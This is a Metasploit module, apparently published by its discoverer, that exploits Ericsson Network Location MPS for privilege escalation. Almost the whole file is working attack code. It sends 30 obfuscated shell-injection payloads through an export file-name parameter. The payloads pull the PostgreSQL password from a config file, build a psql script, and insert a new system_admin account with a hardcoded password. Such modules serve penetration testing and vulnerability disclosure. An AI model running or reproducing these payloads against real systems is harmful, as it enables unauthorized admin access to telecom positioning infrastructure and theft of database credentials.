##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Ericsson Network Location MPS - Privilege Escalation (Meow Variant)',
      'Description'    => %q(
        This module exploits privilege escalation vulnerability in Ericsson Network Location Mobile Positioning Systems.
        It creates a new admin user with SQL Query. Thanks to the Meow variant, it does this with the PostgreSQL password it stole.
        Therefore low authority user can gain the authority of "admin" on the application.

	You can examine the exploit "Restrictions Bypass RCE", which is the main source of the vulnerability.
        "version":"GMPC21","product_number":"CSH 109 025 R6A", "cluster version: 21"

        /////// This 0day has been published at DEFCON29-PHV Village. ///////

      ),
      'References'     =>
        [
          [ 'CVE', '2021-' ],
          [ 'URL', 'https://pentest.com.tr/blog/RCE-via-Meow-Variant-along-with-an-Example-0day-PacketHackingVillage-Defcon-29.html' ],
          [ 'URL', 'https://www.ericsson.com/en/portfolio/digital-services/automated-network-operations/analytics-and-assurance/ericsson-network-location'],
          [ 'URL', 'https://www.wallofsheep.com/pages/dc29#akkus']
        ],
      'Author'         =>
        [
          'Özkan Mustafa AKKUŞ <AkkuS>' # Discovery & PoC & MSF Module @ehakkus
        ],
      'License'        => MSF_LICENSE,
      'DisclosureDate' => "Apr 21 2021",
      'DefaultOptions' =>
        {
          'RPORT' => 10083,
          'SSL'   => true
        }
    ))

    register_options([
	OptString.new('USERNAME',  [true, 'NLG Username']),
        OptString.new('PASSWORD',  [true, 'NLG Password']),
        OptString.new('TARGETURI',  [true, 'Base path for NLG application', '/'])
    ])
  end
  # for Origin and Referer headers
  def peer
    "#{ssl ? 'https://' : 'http://' }#{rhost}:#{rport}"
  end
  # split strings to salt
  def split(data, string_to_split)
    word = data.scan(/"#{string_to_split}":"([\S\s]*?)"/)
    string = word.split('"]').join('').split('["').join('')
    return string
  end

  def cluster

    res = send_request_cgi({
	  # clusters information to API directories
      'uri'     => normalize_uri(target_uri.path, 'api', 'value', 'v1', 'data', 'clusters'),
	  'method'  => 'GET'
    })

    if res && res.code == 200 && res.body =~ /version/
      cls_version = split(res.body, "version")
      cls_node_type = split(res.body, "node_type")
      cls_name = split(res.body, "cluster_name")
      cls_id = cls_version + "-" + cls_node_type + "-" + cls_name
      return cls_version, cls_node_type, cls_name, cls_id
    else
      fail_with(Failure::NotVulnerable, 'Cluster not detected. Check the informations!')
    end
  end

  def permission_check(token)
    # By giving numbers to the vulnerable areas, we can easily use them in JSON format.
    json_urls = '{"1":"/cells/gsm/cgi_cells/","2":"/smpp/", "3":"/positioning_controls/gsm/", "4":"/psap/wireless/specific_routings/", "5":"/numbering/plmns/"}'
    parse = JSON.parse(json_urls)
    cls_id = cluster[3]
    cls_node_type = cluster[1]

    i = 1
    while i <= 6 do
       link = parse["#{i}"]
       i +=1
       # The cells export operation returns 409 response when frequent requests are made.
       # Therefore, if it is time for check cells import operation, we tell expoit to sleep for 2 seconds.
       if link == "/cells/gsm/cgi_cells/"
	 sleep(7)
       end
       filename = Rex::Text.rand_text_alpha_lower(6)

       res = send_request_cgi({
         'uri'     => normalize_uri(target_uri.path, 'api', 'value', 'v1', 'data', cls_id, cls_node_type, link, 'export?file_name=/export/home/mpcadmin/', filename),
	     'method'  => 'GET',
	     'headers' =>
           {
		     'X-Auth-Token' => token,
             'Origin' => "#{peer}"
           }
       })

       if res && res.code == 403 then # !200
	 next
       elsif res && res.code == 200
	 return link, true
       elsif res && res.code == 400
	 return link, true
       elsif res && res.code == 404 # This means i == 5 (a non index) and response returns 404.
         return "no link", false
       end
    end
  end

  def check
    # check connection and login
    token = login(datastore['USERNAME'], datastore['PASSWORD'])
    res = send_request_cgi({
      # product information check
      'uri'     => normalize_uri(target_uri.path, 'api', 'value', 'v1', 'data', cluster[3], 'product_info', 'about'),
	  'method'  => 'GET',
	  'headers' =>
        {
		  'X-Auth-Token' => token,
          'Origin' => "#{peer}"
        }
    })

    if res && res.code == 200 && res.body =~ /version/
      version = split(res.body, "version")
      pnumber = split(res.body, "product_number")
      print_status("Product Number:#{pnumber} - Version:#{version}")
      return Exploit::CheckCode::Appears
    else
      return Exploit::CheckCode::Safe
    end
  end

  def login(user, pass)

    json_login = '{"auth": {"method": "password","password": {"user_id": "' + datastore["USERNAME"] + '","password": "' + datastore["PASSWORD"] + '"}}}'

    res = send_request_cgi(
      {
      'method' => 'POST',
      'ctype'  => 'application/json',
      'uri' => normalize_uri(target_uri.path, 'api', 'login', 'nlg', 'gmpc', 'auth', 'tokens'),
      'headers' =>
        {
          'Origin' => "#{peer}"
        },
      'data' => json_login
      })

    if res && res.code == 200 && res.body =~ /true/
      auth_token = split(res.body, "authToken")
      return auth_token
    else
      fail_with(Failure::NotVulnerable, 'Login failed. Check your informations!')
    end
  end

  def prep_payloads(token, link)
        configname = Rex::Text.rand_text_alpha_lower(12)
	newuser = Rex::Text.rand_text_alpha_lower(8)
	newpass = "PrivEsc0day!"
        #/       = 2F   - y
        #;       = 3B   - z
        #|       = 7C   - p
        #>&      = 3E26 - v
        #>/      = 3E2F - g
        #>       = 3E   - k
        #<       = 3C   - c
        #'       = 27   - t
        #$       = 24   - d
        #\       = 5C   - b
        #!       = 21   - u
        #"       = 22   - x
        #(       = 28   - m
        #)       = 29   - i
        #,       = 2C   - o
        #_       = 5F   - a
	# echo `xxd -r -p <<< 2F`>y
	payloads = '{"1":"' + Rex::Text.uri_encode("IFS=',.';echo${IFS}`xxd${IFS}-r${IFS}-p${IFS}<<<${IFS}2F`>y&&pwd>fl") +'", '
   	# echo `xxd -r -p <<< 3B`>z
	payloads << '"2":"' + Rex::Text.uri_encode("IFS=',.';echo${IFS}`xxd${IFS}-r${IFS}-p${IFS}<<<${IFS}3B`>z&&pwd>fl") +'", '
	#echo `xxd -r -p <<< 7C`>p
	payloads << '"3":"' + Rex::Text.uri_encode("IFS=',.';echo${IFS}`xxd${IFS}-r${IFS}-p${IFS}<<<${IFS}7C`>p&&pwd>fl") +'", '
	#echo `xxd -r -p <<< 3E26`>v
	payloads << '"4":"' + Rex::Text.uri_encode("IFS=',.';echo${IFS}`xxd${IFS}-r${IFS}-p${IFS}<<<${IFS}3E26`>v&&pwd>fl") +'", '
	#echo `xxd -r -p <<< 3E`>k
	payloads << '"5":"' + Rex::Text.uri_encode("IFS=',.';echo${IFS}`xxd${IFS}-r${IFS}-p${IFS}<<<${IFS}3E`>k&&pwd>fl") +'", '
	#echo `xxd -r -p <<< 27`>t
	payloads << '"6":"' + Rex::Text.uri_encode("IFS=',.';echo${IFS}`xxd${IFS}-r${IFS}-p${IFS}<<<${IFS}27`>t&&pwd>fl") +'", '
	#echo `xxd -r -p <<< 24`>d
	payloads << '"7":"' + Rex::Text.uri_encode("IFS=',.';echo${IFS}`xxd${IFS}-r${IFS}-p${IFS}<<<${IFS}24`>d&&pwd>fl") +'", '
	#echo `xxd -r -p <<< 5C`>b
	payloads << '"8":"' + Rex::Text.uri_encode("IFS=',.';echo${IFS}`xxd${IFS}-r${IFS}-p${IFS}<<<${IFS}5C`>b&&pwd>fl") +'", '
        #echo `xxd -r -p <<< 21`>u
	payloads << '"9":"' + Rex::Text.uri_encode("IFS=',.';echo${IFS}`xxd${IFS}-r${IFS}-p${IFS}<<<${IFS}21`>u&&pwd>fl") +'", '
    	#echo `xxd -r -p <<< 22`>x
	payloads << '"10":"' + Rex::Text.uri_encode("IFS=',.';echo${IFS}`xxd${IFS}-r${IFS}-p${IFS}<<<${IFS}22`>x&&pwd>fl") +'", '
	#echo `xxd -r -p <<< 28`>x
	payloads << '"11":"' + Rex::Text.uri_encode("IFS=',.';echo${IFS}`xxd${IFS}-r${IFS}-p${IFS}<<<${IFS}28`>m&&pwd>fl") +'", '
	#echo `xxd -r -p <<< 29`>x
	payloads << '"12":"' + Rex::Text.uri_encode("IFS=',.';echo${IFS}`xxd${IFS}-r${IFS}-p${IFS}<<<${IFS}29`>i&&pwd>fl") +'", '
	#echo `xxd -r -p <<< 2C`>x
	payloads << '"13":"' + Rex::Text.uri_encode("IFS=',.';echo${IFS}`xxd${IFS}-r${IFS}-p${IFS}<<<${IFS}2C`>o&&pwd>fl") +'", '
	#echo `xxd -r -p <<< 5F`>x
	payloads << '"14":"' + Rex::Text.uri_encode("IFS=',.';echo${IFS}`xxd${IFS}-r${IFS}-p${IFS}<<<${IFS}5F`>a&&pwd>fl") +'", '
	#cp /opt/consul/setting/factory/GMPC/parameter/gmpc_schema.json [random-file-name].json
	payloads << '"15":"' + Rex::Text.uri_encode("IFS=',.';cp${IFS}`cat${IFS}y`opt`cat${IFS}y`consul`cat${IFS}y`setting`cat${IFS}y`factory`cat${IFS}y`GMPC`cat${IFS}y`parameter`cat${IFS}y`gmpc_schema.json${IFS}#{configname}.json&&pwd>fl") +'", '
	#echo sed '31843!d' [random-file-name].json > pass1.sh
	payloads << '"16":"' + Rex::Text.uri_encode("IFS=',.';echo${IFS}sed${IFS}`cat${IFS}t`31843`cat${IFS}u`d`cat${IFS}t`${IFS}#{configname}.json${IFS}>pass1.sh&&pwd>fl") +'", '
    	#chmod +x pass1.sh
	payloads << '"17":"' + Rex::Text.uri_encode("IFS=',.';chmod${IFS}+x${IFS}pass1.sh&&pwd>fl") +'", '
	#sh pass1.sh > pass2
	payloads << '"18":"' + Rex::Text.uri_encode("IFS=',.';sh${IFS}pass1.sh>pass2&&pwd>fl") +'", '
    	#cat pass2 | awk -F[:,\"] '{print $5}' > pass3.sh
	payloads << '"19":"' + Rex::Text.uri_encode("IFS=',.';echo${IFS}cat${IFS}pass2${IFS}`cat${IFS}p`${IFS}awk${IFS}-F[:,`cat${IFS}b``cat${IFS}x`]${IFS}`cat${IFS}t`{print${IFS}`cat${IFS}d`5}`cat${IFS}t`>pass3.sh&&pwd>fl") +'", '
    	#chmod +x pass3.sh
	payloads << '"20":"' + Rex::Text.uri_encode("IFS=',.';chmod${IFS}+x${IFS}pass3.sh&&pwd>fl") +'", '
	#sh pass3.sh > passlast
	#passlast will be pgsql password...
	payloads << '"21":"' + Rex::Text.uri_encode("IFS=',.';sh${IFS}pass3.sh>passlast&&pwd>fl") +'", '
	#echo PGPASSWORD='`cat passlast`' > sqlq1
	payloads << '"22":"' + Rex::Text.uri_encode("IFS=',.';echo${IFS}PGPASSWORD=`cat${IFS}t``cat${IFS}passlast``cat${IFS}t`>sqlq1&&pwd>fl") +'", '
	#echo '/opt/pgsql/bin/psql -U mps -d mpsdb -c "INSERT INTO ' > sqlq2
	payloads << '"23":"' + Rex::Text.uri_encode("IFS=',.';echo${IFS}`cat${IFS}y`opt`cat${IFS}y`pgsql`cat${IFS}y`bin`cat${IFS}y`psql${IFS}-U${IFS}mps${IFS}-d${IFS}mpsdb${IFS}-c${IFS}`cat${IFS}x`INSERT${IFS}INTO>sqlq2&&pwd>fl") +'", '
	#echo 'omuser(id,enabled,fail_times,latest_fail_at,name' > sqlq3
	payloads << '"24":"' + Rex::Text.uri_encode("IFS=',.';echo${IFS}omuser`cat${IFS}m`id`cat${IFS}o`enabled`cat${IFS}o`fail`cat${IFS}a`times`cat${IFS}o`latest`cat${IFS}a`fail`cat${IFS}a`at`cat${IFS}o`name>sqlq3&&pwd>fl") +'", '
	#echo ',password,password_expires_at,role)' > sqlq4
	payloads << '"25":"' + Rex::Text.uri_encode("IFS=',.';echo${IFS}`cat${IFS}o`password`cat${IFS}o`password`cat${IFS}a`expires`cat${IFS}a`at`cat${IFS}o`role`cat${IFS}i`>sqlq4&&pwd>fl") +'", '
	#echo "VALUES ('privesc155',0,0,0,'test8day','" > sqlq5
	payloads << '"26":"' + Rex::Text.uri_encode("IFS=',.';echo${IFS}VALUES${IFS}`cat${IFS}m``cat${IFS}t`#{newuser}`cat${IFS}t``cat${IFS}o`0`cat${IFS}o`0`cat${IFS}o`0`cat${IFS}o``cat${IFS}t`#{newuser}`cat${IFS}t``cat${IFS}o``cat${IFS}t`>sqlq5&&pwd>fl") +'", '
	# echo ada628c3ae88b9cf90e61d26d2d852c161e30de9',0,'system_admin');" > sqlq6
	payloads << '"27":"' + Rex::Text.uri_encode("IFS=',.';echo${IFS}ada628c3ae88b9cf90e61d26d2d852c161e30de9`cat${IFS}t``cat${IFS}o`0`cat${IFS}o``cat${IFS}t`system`cat${IFS}a`admin`cat${IFS}t``cat${IFS}i``cat${IFS}z``cat${IFS}x`>sqlq6&&pwd>fl") +'", '
	#echo `cat sqlq1` `cat sqlq2``cat sqlq3``cat sqlq4` `cat sqlq5``cat sqlq6` > sqlq7.sh
	payloads << '"28":"' + Rex::Text.uri_encode("IFS=',.';echo${IFS}`cat${IFS}sqlq1`${IFS}`cat${IFS}sqlq2`${IFS}`cat${IFS}sqlq3``cat${IFS}sqlq4`${IFS}`cat${IFS}sqlq5``cat${IFS}sqlq6`>sqlq7.sh&&pwd>fl") +'", '
        #chmod +x sqlq7.sh
	payloads << '"29":"' + Rex::Text.uri_encode("IFS=',.';chmod${IFS}+x${IFS}sqlq7.sh&&pwd>fl") +'", '
	#sh sqlq7.sh
	payloads << '"30":"' + Rex::Text.uri_encode("IFS=',.';sh${IFS}sqlq7.sh&&pwd>fl") +'"}'

	if link == "/cells/gsm/cgi_cells/"
	  print_status("Your user must be 'gmpc_celldata_admin'. That's why Expoit going to run slowly. Please be patient!")
	end
    	parse = JSON.parse(payloads)
	cls_id = cluster[3]
	cls_node_type = cluster[1]
	i = 1
	while i <= 31 do
	   pay = parse["#{i}"]
	   i +=1

	   if link == "/cells/gsm/cgi_cells/"
	    sleep(15)
	   end

       	   send_payloads(cls_id, cls_node_type, token, link, pay)
           if i == 31
             check_user(newuser, newpass, link)
           end
         end
  end

  def check_user(user, pass, link)

    json_login = '{"auth": {"method": "password","password": {"user_id": "' + user + '","password": "' + pass + '"}}}'
    if link == "/cells/gsm/cgi_cells/"
	  print_good("Privilege escalation successful!")
      	  print_good("The new system admin user has been created successfully.")
	  print_status("New User : #{user}")
	  print_status("New Pass : #{pass}")
    else
      res = send_request_cgi(
        {
        'method' => 'POST',
        'ctype'  => 'application/json',
        'uri' => normalize_uri(target_uri.path, 'api', 'login', 'nlg', 'gmpc', 'auth', 'tokens'),
        'headers' =>
          {
            'Origin' => "#{peer}"
          },
        'data' => json_login
        })

      if res && res.code == 200 && res.body =~ /true/
	    print_good("Privilege escalation successful!")
            print_good("The new system admin user has been created successfully.")
	    print_status("New User : #{user}")
	    print_status("New Pass : #{pass}")
      else
	    fail_with(Failure::NotVulnerable, 'Something went wrong. New user could not be created.')
      end
    end
  end

  def get_pgsql_pass(config_name)

    res = send_request_cgi({
      'uri'     => normalize_uri(target_uri.path, config_name),
	  'method'  => 'GET',
	  'headers' =>
        {
          'Origin' => "#{peer}"
        }
      })

	parse = JSON.parse(res.body)
	pass = parse['AML']
	puts pass
  end


  def send_payloads(id, type, token, link, pay)

    res = send_request_cgi({
      'uri'     => normalize_uri(target_uri.path, 'api', 'value', 'v1', 'data', id, type, link, "export?file_name=/export/home/mpcadmin/%7C#{pay}"),
	  'method'  => 'GET',
	  'headers' =>
        {
		  'X-Auth-Token' => token,
          'Origin' => "#{peer}"
        }
      })

  end

  ##
  # Exploiting phase
  ##
  def run

    auth_token = login(datastore['USERNAME'], datastore['PASSWORD'])
    unless permission_check(auth_token)[1] == true
      fail_with(Failure::NotVulnerable, 'The user has no permission to perform the operation!')
    else
      perm_link = permission_check(auth_token)[0]
      print_good("Excellent! The user #{datastore['USERNAME']} has permission on #{perm_link}")
    end

    prep_payloads(auth_token, perm_link)

  end
end